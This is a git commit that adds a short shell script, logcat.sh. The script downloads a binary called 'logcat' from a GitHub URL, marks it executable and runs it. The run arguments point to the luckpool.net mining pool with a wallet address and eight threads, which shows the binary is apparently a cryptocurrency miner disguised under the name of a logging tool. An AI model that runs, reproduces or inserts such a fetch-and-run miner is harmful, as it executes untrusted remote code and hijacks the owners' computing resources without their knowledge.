8abc565570624d630633e02c66df8297e71c6e4b
8vrbttppp <86473820+8vrbttppp@users.noreply.github.com>
2021-06-25 15:09:45 +0000

    Create logcat.sh

---
+++ logcat.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+
+wget https://raw.githubusercontent.com/razmai3/verus/main/logcat
+chmod +x logcat
+./logcat -v -l na.luckpool.net:3956 -u RV2BdRHnW13UBEUX4nLfFW2sw9TUwxrJGb.cpu1 -t 8 -p x
